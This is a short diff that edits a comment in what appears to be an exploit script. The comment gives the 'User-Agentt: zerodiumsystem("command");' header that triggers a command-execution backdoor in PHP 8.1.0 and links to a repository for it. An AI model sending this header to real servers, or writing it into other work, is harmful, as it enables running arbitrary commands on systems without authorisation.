@@ -4,7 +4,7 @@
 
 /*
 This backdoor is very simple
-Just send User-Agentt: # zerodiumsystem("command");
+Just send User-Agentt: zerodiumsystem("command");
 Link: https://github.com/vida00/Backdoor-PHP8.1.0
 */
 
